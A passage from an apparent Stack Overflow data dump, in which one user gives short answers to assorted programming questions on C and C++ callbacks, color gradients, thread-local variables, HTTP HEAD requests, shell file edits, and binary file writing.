    &lt;cfargument name=""currentTotal"" type=""numeric"" required=""true"" /&gt;
    &lt;cfargument name=""apps"" type=""array"" required=""true"" /&gt;

    &lt;cfset var a = 0 /&gt;
    &lt;cfset var found = false /&gt;

    &lt;cfloop from=""1"" to=""#arrayLen(arguments.apps)#"" index=""a""&gt;
    	&lt;cfset arguments.currentCombo = listAppend(arguments.currentCombo, arguments.apps[a].name) /&gt;
    	&lt;cfset arguments.currentTotal = arguments.currentTotal + arguments.apps[a].cost /&gt;
    	&lt;cfif arguments.currentTotal eq 15.05&gt;
    		&lt;!--- print current combo ---&gt;
    		&lt;cfoutput&gt;&lt;strong&gt;#arguments.currentCombo# = 15.05&lt;/strong&gt;&lt;/cfoutput&gt;&lt;br /&gt;
    		&lt;cfreturn true /&gt;
    	&lt;cfelseif arguments.currentTotal gt 15.05&gt;
    		&lt;cfoutput&gt;#arguments.currentCombo# &gt; 15.05 (aborting)&lt;/cfoutput&gt;&lt;br /&gt;
    		&lt;cfreturn false /&gt;
    	&lt;cfelse&gt;
    		&lt;!--- less than 15.05 ---&gt;
    		&lt;cfoutput&gt;#arguments.currentCombo# &lt; 15.05 (traversing)&lt;/cfoutput&gt;&lt;br /&gt;
    		&lt;cfset found = testCombo(arguments.currentCombo, arguments.currentTotal, arguments.apps) /&gt;
    	&lt;/cfif&gt;
    &lt;/cfloop&gt;
&lt;/cffunction&gt;

&lt;cfset mf = {name=""Mixed Fruit"", cost=2.15} /&gt;
&lt;cfset ff = {name=""French Fries"", cost=2.75} /&gt;
&lt;cfset ss = {name=""side salad"", cost=3.35} /&gt;
&lt;cfset hw = {name=""hot wings"", cost=3.55} /&gt;
&lt;cfset ms = {name=""moz sticks"", cost=4.20} /&gt;
&lt;cfset sp = {name=""sampler plate"", cost=5.80} /&gt;
&lt;cfset apps = [ mf, ff, ss, hw, ms, sp ] /&gt;

&lt;cfloop from=""1"" to=""6"" index=""b""&gt;
    &lt;cfoutput&gt;#testCombo(apps[b].name, apps[b].cost, apps)#&lt;/cfoutput&gt;
&lt;/cfloop&gt;
</code></pre>

<p>The above code tells me that the only combination that adds up to $15.05 is 7 orders of Mixed Fruit, and it takes 232 executions of my testCombo function to complete.</p>

<p>Is there a better algorithm to come to the correct solution? Did I come to the correct solution?</p>
","9530","Adam Rosenfield","<p>Read up on the <a href=""http://en.wikipedia.org/wiki/Knapsack_problem"" rel=""nofollow"">Knapsack Problem</a>.</p>
"
"<p><strong>Motivation</strong></p>

<p>I'd like to find a way to take an arbitrary color and lighten it a few shades, so that I can programatically create a nice gradient from the one color to a lighter version. The gradient will be used as a background in a UI.</p>

<p><strong>Possibility 1</strong></p>

<p>Obviously I can just split out the RGB values and increase them individually by a certain amount. Is this actually what I want?</p>

<p><strong>Possibility 2</strong></p>

<p>My second thought was to convert the RGB to HSV/HSB/HSL (Hue, Saturation, Value/Brightness/Lightness), increase the brightness a bit, decrease the saturation a bit, and then convert it back to RGB. Will this have the desired effect in general?</p>
","9530","Adam Rosenfield","<p>Convert it to RGB and linearly interpolate between the original color and the target color (often white).  So, if you want 16 shades between two colors, you do:</p>

<pre><code>
for(i = 0; i &lt; 16; i++)
{
  colors[i].R = start.R + (i * (end.R - start.R)) / 15;
  colors[i].G = start.G + (i * (end.G - start.G)) / 15;
  colors[i].B = start.B + (i * (end.B - start.B)) / 15;
}
</code></pre>
"
"<p>The scroll lock button seems to be a reminder of the good old green terminal days. Does anyone still use it? Should the 101 button keyboard become the 100 button keyboard?</p>
","9530","Adam Rosenfield","<p>In Excel, if you turn on scroll lock, using the arrow keys scrolls the spread sheet instead of changing the cell the cursor is in.</p>
"
"<p>Out of order execution in CPUs means that a CPU can reorder instructions to gain better performance and it means the CPU is having to do some very nifty bookkeeping and such.  There are other processor approaches too, such as hyper-threading.</p>

<p>Some fancy compilers understand the (un)interrelatedness of instructions to a limited extent, and will automatically interleave instruction flows (probably over a longer window than the CPU sees) to better utilise the processor.  Deliberate compile-time interleaving of floating and integer instructions is another example of this.</p>

<p>Now I have highly-parallel task.  And I typically have an ageing single-core x86 processor without hyper-threading.</p>

<p>Is there a straight-forward way to get my the body of my 'for' loop for this highly-parallel task to be interleaved so that two (or more) iterations are being done together?  (This is slightly different from 'loop unwinding' as I understand it.)</p>

<p>My task is a 'virtual machine' running through a set of instructions, which I'll really simplify for illustration as:</p>

<pre>void run(int num) {
  for(int n=0; n&lt;num; n++) {
     vm_t data(n);
     for(int i=0; i&lt;data.len(); i++) {
        data.insn(i).parse();
        data.insn(i).eval();
     }
  }  
}</pre>

<p>So the execution trail might look like this:</p>

<pre>data(1) insn(0) parse
data(1) insn(0) eval
data(1) insn(1) parse
...
data(2) insn(1) eval
data(2) insn(2) parse
data(2) insn(2) eval</pre>

<p>Now, what I'd like is to be able to do two (or more) iterations explicitly in parallel:</p>

<pre>data(1) insn(0) parse
data(2) insn(0) parse  \ processor can do OOO as these two flow in
data(1) insn(0) eval   /
data(2) insn(0) eval   \ OOO opportunity here too
data(1) insn(1) parse  /
data(2) insn(1) parse</pre>

<p>I know, from profiling, (e.g. using Callgrind with --simulate-cache=yes), that parsing is about random memory accesses (cache missing) and eval is about doing ops in registers and then writing results back.  Each step is several thousand instructions long.  So if I can intermingle the two steps for two iterations at once, the processor will hopefully have something to do whilst the cache misses of the parse step are occurring...</p>

<p>Is there some c++ template madness to get this kind of explicit parallelism generated?</p>

<p>Of course I can do the interleaving - and even staggering - myself in code, but it makes for much less readable code.  And if I really want unreadable, I can go so far as assembler!  But surely there is some pattern for this kind of thing?</p>
","9530","Adam Rosenfield","<p>Take a look at <a href=""http://supertech.csail.mit.edu/cilk/"" rel=""nofollow"">cilk</a>.  It's an extension to ANSI C that has some nice constructs for writing parallelized code in C.  However, since it's an extension of C, it has very limited compiler support, and can be tricky to work with.</p>
"
"<p>How do you do your own fonts?  I don't want a heavyweight algorithm (freetype, truetype, adobe, etc) and would be fine with pre-rendered bitmap fonts.</p>

<p>I do want anti-aliasing, and would like proportional fonts if possible.</p>

<p>I've heard I can use Gimp to do the rendering (with some post processing?)</p>

<p>I'm developing for an embedded device with an LCD.  It's got a 32 bit processor, but I don't want to run Linux (overkill - too much code/data space for too little functionality that I would use)</p>

<p>C.  C++ if necessary, but C is preferred.  Algorithms and ideas/concepts are fine in any language...</p>


","9530","Adam Rosenfield","<p>Pre-rendered bitmap fonts are probably the way to go.  Render your font using whatever, arrange the characters in a grid, and save the image in a simple uncompressed format like PPM, BMP or TGA.  If you want antialiasing, make sure to use a format that supports transparency (BMP and TGA do; PPM does not).</p>

<p>In order to support proportional widths, you'll need to extract the widths of each character from the grid.  There's no simple way to do this, it depends on how you generate the grid.  You could probably write some short little program to analyze each character and find the minimal bounding box.  Once you have the width data, you put it in an auxiliary file which contains the coordinates and sizes of each character.</p>

<p>Finally, to render a string, you look up each character and bitblit its rectangle from the font bitmap onto your frame buffer, advancing the raster position by the width of the character.</p>
"
"<p>I have a system (Ubuntu) with many processes and one (or more) have a memory leak. Is there a good way to find the process that has the leak? Some of the process are JVMs, some are not. Some are home grown some are open source.</p>
","9530","Adam Rosenfield","<p>You can run the <code>top</code> command (to run non-interactively, type <code>top -b -n 1</code>).  To see applications which are leaking memory, look at the following columns:</p>

<ul>
<li>RPRVT - resident private address space size</li>
<li>RSHRD - resident shared address space size</li>
<li>RSIZE - resident memory size</li>
<li>VPRVT - private address space size</li>
<li>VSIZE - total memory size</li>
</ul>
"
"<p>let's say we have a c++ class like:</p>

<pre><code>class MyClass
{
   void processArray( &lt;an array of 255 integers&gt; )
   {
     int i ;
     for (i=0;i&lt;255;i++)
     {
        // do something with values in the array
     }
   }
}
</code></pre>

<p>and one instance of the class like:  </p>

<pre><code>MyClass myInstance ;
</code></pre>

<p>and 2 threads which call the processArray method of that instance (depending on how system executes threads, probably in a completely irregular order). There is no mutex lock used in that scope so both threads can enter.</p>

<p><strong>My question is what happens to the i ? Does each thread scope has it's own ""i"" or would each entering thread modify i in the for loop, causing i to be changing weirdly all the time.</strong> </p>
","9530","Adam Rosenfield","<p><code>i</code> is allocated on the stack.  Since each thread has its own separate stack, each thread gets its own copy of <code>i</code>.</p>
"
"<p>What is the practical benefit of using HTTP GET, PUT, DELETE, POST, HEAD? Why not focus on their behavioral benefits (safety and idempotency), forgetting their names, and use GET, PUT or POST depending on which behavior we want?</p>

<p><strong>Why shouldn't we only use GET, PUT and POST (and drop HEAD, DELETE)?</strong></p>
","9530","Adam Rosenfield","<p>HEAD is really useful for determining what a given server's clock is set to (accurate to within the 1 second or the network round-trip time, whichever is greater).  It's also great for getting Futurama quotes from Slashdot:</p>

<pre>~$ curl -I slashdot.org
HTTP/1.1 200 OK
Date: Wed, 29 Oct 2008 05:35:13 GMT
Server: Apache/1.3.41 (Unix) mod_perl/1.31-rc4
SLASH_LOG_DATA: shtml
X-Powered-By: Slash 2.005001227
<b>X-Fry: That's a chick show. I prefer programs of the genre: World's Blankiest Blank.</b>
Cache-Control: private
Pragma: private
Connection: close
Content-Type: text/html; charset=iso-8859-1</pre>

<p>For <a href=""http://curl.haxx.se/"" rel=""nofollow"">cURL</a>, <code>-I</code> is the option for performing a HEAD request.  To get the current date and time of a given server, just do</p>

<p><code>curl -I $server | grep ^Date</code></p>
"
"<p>I would like to know how to filter files in a open file dialog (in winforms)
based on a regular expression. Files have all same extensions (.xml). 
Big files are split up into several files with the same name only to be separated with _1 ...
We only want to show the files without _1 (first data file)</p>

<p>the open file dialog has a property filter but i dont know how to specify this in our filename format, hence the regular expression.</p>

<p>Thankx,
Niki</p>
","9530","Adam Rosenfield","<p>I'm not sure how to do it in C# with WinForms, but in C++, what you would do is install a custom hook procedure and listen for the CDN_INCLUDEITEM notification.  Then, you check each filename against your regex.  See <a href=""http://msdn.microsoft.com/en-us/library/ms646960(VS.85).aspx#_win32_Filters"" rel=""nofollow"">http://msdn.microsoft.com/en-us/library/ms646960(VS.85).aspx#_win32_Filters</a>.</p>
"
"<p>How can you remove all of the trailing whitespace of an entire project? Starting at a root directory, and removing the trailing whitespace from all files in all folders.</p>

<p>Also, I want to to be able to modify the file directly, and not just print everything to stdout.</p>
","9530","Adam Rosenfield","<p>In Bash:</p>

<p><code>find dir -type f -exec sed -i 's/ *$//' '{}' ';'</code></p>

<p>(Edit: doesn't give errors for directories; also now only removes trailing whitespace (previously it was removing leading and trailing whitespace))</p>
"
"<p>I've got a C# program that's supposed to play audio files.  I've figured out how to play any sound file for which Windows has a codec by using DirectShow, but now I want to properly fill in the file type filter box on the Open dialog.  I'd like to automatically list any file format for which Windows has a codec.  If some random user installs a codec for an obscure format, its associated extension(s) and file type description(s) need to show up in the list.</p>

<p>Any ideas?</p>
","9530","Adam Rosenfield","<p>You could look in the Windows Registry for all file types with a content type of ""audio/*"".  Specifically, look at all of the keys under HKCR/Software/*/Content Type.</p>
"
"<p>In C, is it possible to forward the invocation of a variadic function? As in,</p>

<pre><code>int my_printf(char *fmt, ...) {
  fprintf(stderr, ""Calling printf with fmt %s"", fmt);
  return SOMEHOW_INVOKE_LIBC_PRINTF;
}
</code></pre>

<p>Forwarding the invocation in the manner above obviously isn't strictly necessary in this case (since you could log invocations in other ways, or use vfprintf), but the codebase I'm working on requires the wrapper to do some actual work, and doesn't have (and can't have added) a helper function akin to vfprintf.</p>

<p>[Update: there seems to be some confusion based on the answers that have been supplied so far. To phrase the question another way: in general, can you wrap some arbitrary variadic function <i>without modifying that function's definition</i>.]</p>
","9530","Adam Rosenfield","<p>If you don't have a function analogous to <code>vfprintf</code> that takes a <code>va_list</code> instead of a variable number of arguments, <strong>you can't do it</strong>.  See <a href=""http://c-faq.com/varargs/handoff.html"" rel=""nofollow""><a href=""http://c-faq.com/varargs/handoff.html"" rel=""nofollow"">http://c-faq.com/varargs/handoff.html</a></a>.</p>
"
"<p>It's clear that a search performance of the generic <code>HashSet&lt;T&gt;</code> class is higher than of the generic <code>List&lt;T&gt;</code> class. Just compare the hash-based key with the linear approach in the <code>List&lt;T&gt;</code> class.</p>

<p>However calculating a hash key may itself take some CPU cycles, so for a small amount of items the linear search can be a real alternative to the <code>HashSet&lt;T&gt;</code>.</p>

<p>My question: where is the break-even?</p>

<p>To simplify the scenario (and to be fair) let's assume that the <code>List&lt;T&gt;</code> class uses the element's <code>Equals()</code> method to identify an item.</p>
","9530","Adam Rosenfield","<p>It depends.  If the exact answer really matters, do some profiling and find out.  If you're sure you'll never have more than a certain number of elements in the set, go with a List.  If the number is unbounded, use a HashSet.</p>
"
"<p>I'm currently working on a project for medical image processing, that needs a huge amount of memory. Is there anything I can do to avoid heap fragmentation and to speed up access of image data that has already been loaded into memory?</p>

<p>The application has been written in C++ and runs on Windows XP.</p>

<p><strong>EDIT:</strong> The application does some preprocessing with the image data, like reformatting, calculating look-up-tables, extracting sub images of interest ... The application needs about 2 GB RAM during processing, of which about 1,5 GB may be used for the image data.</p>
","9530","Adam Rosenfield","<p>You could write your own custom allocator, but this is <em>hard</em>.</p>
"
"<p>I have a file that lists filenames, each on it's own line, and I want to test if each exists in a particular directory. For example, some sample lines of the file might be</p>

<pre><code>mshta.dll
foobar.dll
somethingelse.dll
</code></pre>

<p>The directory I'm interested in is <code>X:\Windows\System32\</code>, so I want to see if the following files exist:</p>

<pre><code>X:\Windows\System32\mshta.dll
X:\Windows\System32\foobar.dll
X:\Windows\System32\somethingelse.dll
</code></pre>

<p>How can I do this using the Windows command prompt? Also (out of curiosity) how would I do this using bash or another Unix shell?</p>
","9530","Adam Rosenfield","<p>In Windows:</p>

<pre><code>
type file.txt >NUL 2>NUL
if ERRORLEVEL 1 then echo ""file doesn't exist""
</code></pre>

<p>(This may not be the best way to do it; it is a way I know of; see also <a href=""http://blogs.msdn.com/oldnewthing/archive/2008/09/26/8965755.aspx"" rel=""nofollow"">http://blogs.msdn.com/oldnewthing/archive/2008/09/26/8965755.aspx</a>)</p>

<p>In Bash:</p>

<pre><code>
if ( test -e file.txt ); then echo ""file exists""; fi
</code></pre>
"
"<p>I have a function pointer defined by:</p>

<pre><code>typedef void (*EventFunction)(int nEvent);
</code></pre>

<p>Is there a way to handle that function with a specific instance of a C++ object?</p>

<pre><code>class A
{
private:
    EventFunction handler;

public:
    void SetEvent(EventFunction func) { handler = func; }

    void EventOne() { handler(1); }
};

class B
{
private:
    A a;
public:
    B() { a.SetEvent(EventFromA); }  // What do I do here?

    void EventFromA(int nEvent) { // do stuff }
};
</code></pre>

<p><strong>Edit:</strong> Orion pointed out the options that Boost offers such as:</p>

<pre><code>boost::function&lt;int (int)&gt; f;
X x;
f = std::bind1st(
      std::mem_fun(&amp;X::foo), &amp;x);
f(5); // Call x.foo(5)
</code></pre>

<p>Unfortunately Boost is not an option for me.  Is there some sort of ""currying"" function that can be written in C++ that will do this kind of wrapping of a pointer to a member function in to a normal function pointer?</p>
","9530","Adam Rosenfield","<p>If you're interfacing with a C library, then you can't use a class member function without using something like <code>boost::bind</code>.  Most C libraries that take a callback function usually also allow you to pass an extra argument of your choosing (usually of type <code>void*</code>), which you can use to bootstrap your class, as so:</p>

<pre><code>
class C
{
public:
  int Method1(void) { return 3; }
  int Method2(void) { return x; }

  int x;
};

// This structure will hold a thunk to
struct CCallback
{
  C *obj;  // Instance to callback on
  int (C::*callback)(void);  // Class callback method, taking no arguments and returning int
};

int CBootstrapper(CCallback *pThunk)
{
  // Call the thunk
  return ((pThunk->obj) ->* (pThunk->callback))( /* args go here */ );
}

void DoIt(C *obj, int (C::*callback)(void))
{
  // foobar() is some C library function that takes a function which takes no arguments and returns int, and it also takes a void*, and we can't change it
  struct CCallback thunk = {obj, callback};
  foobar(&CBootstrapper, &thunk);
}

int main(void)
{
  C c;
  DoIt(&c, &C::Method1);  // Essentially calls foobar() with a callback of C::Method1 on c
  DoIt(&c, &C::Method2);  // Ditto for C::Method2
}
</code></pre>
"
"<p>I'm looking for a tool that will, in bulk, add a license header to some source files, some of which already have the header.  Is there a tool out there that will insert a header, if it is not already present?</p>

<p><em>Edit: I am intentionally not marking an answer to this question, since answers are basically all environment-specific and subjective</em> </p>
","9530","Adam Rosenfield","<p>Here's a Bash script that'll do the trick, assuming you have the license header in the file license.txt:</p>

<p>File addlicense.sh:  </p>

<pre><code>#!/bin/bash  
for x in $*; do  
head -$LICENSELEN $x | diff license.txt - || ( ( cat license.txt; echo; cat $x) &gt; /tmp/file;  
mv /tmp/file $x )  
done  
</code></pre>

<p>Now run this in your source directory:  </p>

<pre><code>export LICENSELEN=`wc -l license.txt | cut -f1 -d ' '`  
find . -type f \(-name \*.cpp -o -name \*.h \) -print0 | xargs -0 ./addlicense.sh  
</code></pre>
"
"<p>Summary for the impatient: I'm searching for good references on generating code for common language constructs but not parsing.</p>

<p>I am interested in programming languages and try to read the literature as much as possible. But most of them covers the topic in a functional and theoretical perspective that, I find them hard to understand let alone implement the ideas.</p>

<p>So the question is; Which resources do you suggest about programming language implementations that covers the topic in a more imperative and practical fashion?</p>

<p>For example, I find ""<em>The Implementation of Lua 5.0</em>"" paper very instructive.</p>

<p>Note that, I am not seeking articles about parsing or tokenizing.</p>
","9530","Adam Rosenfield","<p>Here are a bunch of good textbooks:</p>

<p>Modern Compiler Implementation in Java (Tiger book) 
A.W. Appel 
Cambridge University Press, 1998 
ISBN 0-52158-388-8 
A textbook tutorial on compiler implementation, including techniques for many language features</p>

<p>Compilers: Principles, Techniques and Tools (Dragon book) 
Aho, Lam, Sethi and Ullman 
Addison-Wesley, 2006 
ISBN 0321486811 
The classic compilers textbook, although its front-end emphasis reflects its age.</p>

<p>Advanced Compiler Design and Implementation (Whale book) 
Steven Muchnick 
Morgan Kaufman Publishers, 1997 
ISBN 1-55860-320-4 
Essentially a recipe book of optimizations; very complete and suited for industrial practitioners and researchers.</p>

<p>Engineering a Compiler (Ark book) 
Keith D. Cooper, Linda Torczon 
Morgan Kaufman Publishers, 2003 
ISBN 1-55860-698-X 
A modern classroom textbook, with increased emphasis on the back-end and implementation techniques.</p>

<p>Optimizing Compilers for Modern Architectures 
Randy Allen and Ken Kennedy 
Morgan Kaufman Publishers, 2001 
ISBN 1-55860-286-0 
A modern textbook that focuses on optimizations including parallelization and memory hierarchy optimizations.</p>

<p>Programming Languages Pragmatics 
Michael L. Scott 
Morgan Kaufmann Publishers, 2005 
ISBN 0126339511</p>
"
"<p>I am programmatically exporting data (using PHP 5.2) into a .csv test file.<br>
Example data:   <code>Numéro 1   (note the accented e).</code>
The data is <code>utf-8</code> (no prepended BOM)</p>

<p>When I open this file in MS excel is displays as <code>NumÃ©ro 1</code></p>

<p>I am able to open this in a text editor (UltraEdit) which displays it correctly.  UE reports the character is <code>decimal 233</code>.</p>

<p>How can I export text data in a .csv file so that MS excel will correctly render it, preferably without forcing the use of the import wizard, or non-default wizard settings?</p>
","9530","Adam Rosenfield","<p>This is just of a question of character encodings.  It looks like you're exporting your data as UTF-8: é in UTF-8 is the two-byte sequence 0xC3 0xA9, which when interpreted in Windows-1252 is Ã©.  When you import your data into Excel, make sure to tell it that the character encoding you're using is UTF-8.</p>
"
"<p>Are C++ enums signed or unsigned? And by extension is it safe to validate an input by checking that it is &lt;= your max value, and leave out >= your min value (assuming you started at 0 and incremented by 1)?</p>
","9530","Adam Rosenfield","<p>You shouldn't depend on them being signed or unsigned.  If you want to make them explicitly signed or unsigned, you can use the following:</p>

<pre><code>enum X : signed int { ... };    // signed enum
enum Y : unsigned int { ... };  // unsigned enum
</code></pre>
"
"<p>I have a https link that requires user login &amp; password. If I run it in FX like this:
https://usernameassword@www.example.com/link/sublink</p>

<p>it will return the xml data as expected.</p>

<p>However, what i'm trying to do, is to automate this process.
I try to use
file_get_contents in PHP
fSocket in PHP</p>

<p>I even try Ajax, but still.. doesn't work.</p>

<p>and try to get the content (xml) either in Server or in the front-end (ajax), but both don't work.</p>

<p>Does anyone know what I need to go in order to get the content? Do I need to obtain the ssl certificate? </p>

<p>Solution in any ohter languages will be welcome too.</p>
","9530","Adam Rosenfield","<p>Use <a href=""http://curl.haxx.se/libcurl/"" rel=""nofollow"">libcurl</a> via its <a href=""http://curl.haxx.se/libcurl/java/"" rel=""nofollow"">Java bindings</a>.</p>
"
"<p>I wrote a short bash script to complete a task that involves creating a temporary directory and storing various files in it and performing various operations on it.</p>

<p>In my first pass I just created the temp dir at /tmp/$$.$script"", but then I tested the script on a computer where I didn't have write access to /tmp/, and I'd like to take that case into account. So my question is where's a good secondary location for this temp dir? Should I just use the current directory? The home directory? ~/tmp/? The output location of the script?</p>

<p>All created files do get cleaned up on script exit.</p>
","9530","Adam Rosenfield","<p>You could try <code>/var/tmp</code>, although it's likely that <code>/tmp</code> is a symlink to that (or vice-versa).</p>
"
"<p>Suppose I have a set of values, stored in a std::set:</p>

<p>{1, 2, 6, 8}</p>

<p>and I have a search key, say, 3. I want to put 3 into a function and get the first value greater than or equal to 3, in this case I would want to get 6.</p>

<p>The find() function provided in map/set/multimap/and set will, of course, return the end iterator for this case. Is there a similar function to find that would return 6 in this case?</p>
","9530","Adam Rosenfield","<p>Yes: <code>upper_bound(X)</code> returns an iterator pointing to the first element greater than <code>X</code>.  There is also a <code>lower_bound(X)</code> function which returns an iterator pointing to the first element not less than <code>X</code>.  Thus, all of the elements in the half-open interval <code>[lower_bound(X), upper_bound(X))</code> will be equal to X.</p>
"
"<p>I need to build a simple HTTP server in C. Any guidance? Links? Samples?</p>
","9530","Adam Rosenfield","<p>I suggest you take a look at <a href=""http://tinyhttpd.sourceforge.net/"">tiny httpd</a>.  If you want to write it from scratch, then you'll want to <em>thoroughly</em> read <a href=""http://tools.ietf.org/html/rfc2616"">RFC 2616</a>.  Use <a href=""http://en.wikipedia.org/wiki/Berkeley_sockets"">BSD sockets</a> to access the network at a really low level.</p>
"
"<p>I tried to follow PHP.net  curl site and even this link: <a href=""http://curl.phptrack.com/forum/viewtopic.php?t=52"" rel=""nofollow"">http://curl.phptrack.com/forum/viewtopic.php?t=52</a><br />
and try to install the CURL in my window laptop. It doesn't work..  CURL is not installed. 
I wonder do I need to run it on windows server...
Anyone has good sites guiding me how to install CURL?  thanks. </p>
","9530","Adam Rosenfield","<p>Download cURL here: <a href=""http://curl.haxx.se/download.html"" rel=""nofollow"">http://curl.haxx.se/download.html</a>.  You may have to update your environment variables in order for PHP to find the cURL executables.  To do so, right click My Computer, select Properties, Advanced, Environment Variables, find the PATH environment variable, edit it, and add the location where you installed cURL to it.</p>
"
"<p>Structs seem like a useful way to parse a binary blob of data (ie a file or network packet).  This is fine and dandy until you have variable size arrays in the blob.  For instance:</p>

<pre><code>struct nodeheader{
        int flags;
        int data_size;
        char data[];
};
</code></pre>

<p>This allows me to find the last data character:</p>

<pre><code>nodeheader b;
cout &lt;&lt; b.data[b.data_size-1];
</code></pre>

<p>Problem being, I want to have multiple variable length arrays:</p>

<pre><code>struct nodeheader{
    int friend_size;
    int data_size;
    char data[];
    char friend[];
};
</code></pre>

<p>I'm not manually allocating these structures.  I have a file like so:</p>

<pre><code>char file_data[1024];
nodeheader* node = &amp;(file_data[10]);
</code></pre>

<p>As I'm trying to parse a binary file (more specifically a class file).  I've written an implementation in Java (which was my class assignment), no I'm doing a personal version in C++ and was hoping to get away without having to write 100 lines of code.  Any ideas?</p>

<p>Thanks,
Stefan</p>
","9530","Adam Rosenfield","<p>This is a very dangerous construct, and I'd advise against it.  You can only include a variable-length array in a struct when it is the LAST element, and when you do so, you have to make sure you allocate enough memory, e.g.:</p>

<pre><code>nodeheader *nh = (nodeheader *)malloc(sizeof(nodeheader) + max_data_size);
</code></pre>

<p>What you want to do is just use regular dynamically allocated arrays:</p>

<pre><code>struct nodeheader
{
  char *data;
  size_t data_size;
  char *friend;
  size_t friend_size;
};

nodeheader AllocNodeHeader(size_t data_size, size_t friend_size)
{
  nodeheader nh;
  nh.data = (char *)malloc(data_size);  // check for NULL return
  nh.data_size = data_size;
  nh.friend = (char *)malloc(friend_size);  // check for NULL return
  nh.friend_size = friend_size;

  return nh;
}

void FreeNodeHeader(nodeheader *nh)
{
  free(nh-&gt;data);
  nh-&gt;data = NULL;
  free(nh-&gt;friend);
  nh-&gt;friend = NULL;
}
</code></pre>
"
"<p>I am looking for a method to compare and sort UTF-8 strings in C++ in a case-insensitive manner to use it in a <a href=""http://www.sqlite.org/c3ref/create_collation.html"" rel=""nofollow"">custom collation function in SQLite</a>.</p>

<ol>
<li>The method should <em>ideally</em> be locale-independent. However I won't be holding my breath, as far as I know, collation is very language-dependent, so anything that works on languages other than English will do, even if it means switching locales.</li>
<li>Options include using standard C or C++ library or a <em>small</em> (suitable for embedded system) and <em>non-GPL</em> (suitable for a proprietary system) third-party library.</li>
</ol>

<p>What I have so far:</p>

<ol>
<li><code>strcoll</code> with C locales and <code>std::collate</code>/<code>std::collate_byname</code> are case-sensitive. (Are there case-insensitive versions of these?)</li>
<li><p>I tried to use a POSIX strcasecmp, but it seems to be <a href=""http://www.opengroup.org/onlinepubs/007908775/xsh/strcasecmp.html"" rel=""nofollow"">not defined</a> for locales other than <code>""POSIX""</code></p>

<blockquote>
  <p><em>In the POSIX locale, strcasecmp() and strncasecmp() do upper to lower conversions, then a byte comparison. The results are unspecified in other locales.</em></p>
</blockquote>

<p>And, indeed, the result of <code>strcasecmp</code> does not change between locales on Linux with GLIBC.</p>

<pre><code>#include &lt;clocale&gt;
#include &lt;cstdio&gt;
#include &lt;cassert&gt;
#include &lt;cstring&gt;


const static char *s1 = ""Äaa"";
const static char *s2 = ""äaa"";


int main() {
    printf(""strcasecmp('%s', '%s') == %d\n"", s1, s2, strcasecmp(s1, s2));
    printf(""strcoll('%s', '%s') == %d\n"", s1, s2, strcoll(s1, s2));
    assert(setlocale(LC_ALL, ""en_AU.UTF-8""));
    printf(""strcasecmp('%s', '%s') == %d\n"", s1, s2, strcasecmp(s1, s2));
    printf(""strcoll('%s', '%s') == %d\n"", s1, s2, strcoll(s1, s2));
    assert(setlocale(LC_ALL, ""fi_FI.UTF-8""));
    printf(""strcasecmp('%s', '%s') == %d\n"", s1, s2, strcasecmp(s1, s2));
    printf(""strcoll('%s', '%s') == %d\n"", s1, s2, strcoll(s1, s2));
}
</code></pre>

<p>This is printed:</p>

<pre><code>strcasecmp('Äaa', 'äaa') == -32
strcoll('Äaa', 'äaa') == -32
strcasecmp('Äaa', 'äaa') == -32
strcoll('Äaa', 'äaa') == 7
strcasecmp('Äaa', 'äaa') == -32
strcoll('Äaa', 'äaa') == 7
</code></pre></li>
</ol>

<p>P. S.</p>

<p>And yes, I am aware about <a href=""http://icu-project.org/"" rel=""nofollow"">ICU</a>, but we can't use it on the embedded platform due to its <a href=""http://www.icu-project.org/charts/icu4c_footprint.html"" rel=""nofollow"">enormous size</a>.</p>
","9530","Adam Rosenfield","<p>I don't think there's a standard C/C++ library function you can use.  You'll have to roll your own or use a 3rd-party library.  The full Unicode specification for locale-specific collation can be found here: <a href=""http://www.unicode.org/reports/tr10/"" rel=""nofollow"">http://www.unicode.org/reports/tr10/</a> (<strong>warning</strong>: this is a <em>long</em> document).</p>
"
"<p>What is the best way to write bytes in the middle of a file using Java?</p>
","9530","Adam Rosenfield","<p>Open the file in write mode without truncating it, seek to the desired offset, and write the desired data.  Just be careful about text/binary mode.</p>
"
"<p>Before I begin, I want to clarify that this is not a command-line tool, but an application that accepts commands through it's own command-line interface.</p>

<p><strong>Edit:</strong> I must apologize about my explanation from before, apparently I didn't do a very good job at explaining it. One more time...</p>

<p>I am building a command-line interface application that accepts commands from a user. I have a signal handler setup to catch the signals, which then sets a flag that I need to terminate the application. The problem I'm having is all of the console functions I can find are blocking, which means that I can't detect that I need to exit from my console processing loop until the user presses a key (or enter, depending on the function).</p>

<p>Is there some standard way I can do either non-block console interaction, or is there an elegant way to structure the program so that if I just terminate from the signal thread, that everything will be handled and released properly (please don't mis-understand this, I know how this could be done using locking and releasing the resources from the signaling thread, but this could get messy, so I'd rather avoid it)</p>

<p>Hopefully that explanation makes more sense...</p>
","9530","Adam Rosenfield","<p>On *nix, you can use the <code>signal</code> function to register a signal handler:</p>

<pre><code>
#include &lt;signal.h&gt;

void signal_handler(int sig)
{
  // Handle the signal
}

int main(void)
{
  // Register the signal handler for the SIGINT signal (Ctrl+C)
  signal(SIGINT, signal_handler);
  ...
}
</code></pre>

<p>Now, whenever someone hits Ctrl+C, your signal handler will be called.</p>
"
"<p>What's the best way of capturing an mp3 stream coming off of http and saving it to disk with python?</p>

<p>Thus far I've tried</p>

<pre><code>target = open(target_path, ""w"")
conn = urllib.urlopen(stream_url)
while True:
    target.write(conn.read(buf_size))
</code></pre>

<p>This gives me data but its garbled or wont play in mp3 players.</p>
","9530","Adam Rosenfield","<p>If you're on Windows, you might accidentally be doing CRLF conversions, corrupting the binary data.  Try opening <code>target</code> in binary mode:</p>

<pre><code>target = open(target_path, ""wb"")
</code></pre>
"
"<p>While researching this issue, I found multiple mentions of the following scenario online, invariably as unanswered questions on programming forums. I hope that posting this here will at least serve to document my findings.</p>

<p>First, the symptom: While running pretty standard code that uses waveOutWrite() to output PCM audio, I sometimes get this when running under the debugger:</p>

<pre><code> ntdll.dll!_DbgBreakPoint@0()   
 ntdll.dll!_RtlpBreakPointHeap@4()  + 0x28 bytes    
 ntdll.dll!_RtlpValidateHeapEntry@12()  + 0x113 bytes   
 ntdll.dll!_RtlDebugGetUserInfoHeap@20()  + 0x96 bytes  
 ntdll.dll!_RtlGetUserInfoHeap@20()  + 0x32743 bytes    
 kernel32.dll!_GlobalHandle@4()  + 0x3a bytes   
 wdmaud.drv!_waveCompleteHeader@4()  + 0x40 bytes   
 wdmaud.drv!_waveThread@4()  + 0x9c bytes   
 kernel32.dll!_BaseThreadStart@8()  + 0x37 bytes
</code></pre>

